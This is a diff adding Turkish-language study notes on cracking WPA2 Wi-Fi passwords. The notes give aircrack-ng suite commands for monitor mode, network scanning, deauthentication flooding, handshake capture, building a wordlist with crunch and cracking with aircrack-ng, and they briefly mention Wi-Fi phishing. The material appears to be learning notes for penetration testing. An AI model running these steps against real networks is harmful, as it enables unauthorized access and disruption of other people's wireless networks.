@@ -1,0 +1,56 @@
+airmon-ng                    -----ağ kartları hakkında bilgi verir
+
+airmon-ng --help ile komut hakkında bilgiler verir.
+airmon-ng <start|stop|check> <interface> [channel or frequency]
+
+airmon-ng check kill                    ilgili olan işlemleri kesmek
+
+Monitor mode alma;
+airmon-ng start wlan0                   ile kablosuz ağı başlatma 
+
+Ağ kartını durdurma
+airmon-ng stop wlan0mon
+
+Ağ hakkında bilgi toplama
+airodump-ng wlan0mon  ağ hakkında bilgi toplama 
+
+  
+
+netsh wlan show network mode=bssid inceleme windows
+
+
+İşlem adımları;
+Kablosuz ağı monitor moda alın 
+Kablosuz ağlar hakkında bilgi toplayın (airodump)
+İstenilen kablosuz ağı tespit edin ve onun hakkında bilgileri detaylandırın.
+Kullanacağınız kablosusuz ağın kanalı ile hedef ağın kanalı aynı kanalda olmalıdır.
+-a ssid no  modu ilgili kablosuz ağa bir durdurma talebinde bulunur.
+deauth paketleri tekrarlanabilirdir.(**)
+deauth sonra verilen sayı yapılan işlemin tekrarıdır ( 0 sonsuz değerdir)
+
++yakalan paketini doğruluğunu aircrack-ng paketadi.cap 
+Bundan sonra parola bilgisi elde etmeye çalışmak;
+crunch 9 9 "1254678" -t Xbank@@@@ -o wpa2pentest.txt
+ilk 9 min karakter
+diğeri 9 mak karakter sayısı
+-t ile parola deseni
+-o output dosyaya yazılması talep edildi.
+
+head -n 13 wpa2.pentest.txt  ilk 13 göster
+
+aircrack-ng WPA2PSK_Pentest-02.cap -w wpa2pentest.txt -0
+
+
+
+
+Pishing ile kablosuz ağ şirefisi;
+
+iwconfig  
+linkset  scripti kullanmak 
+
+
+
+
+
+
+
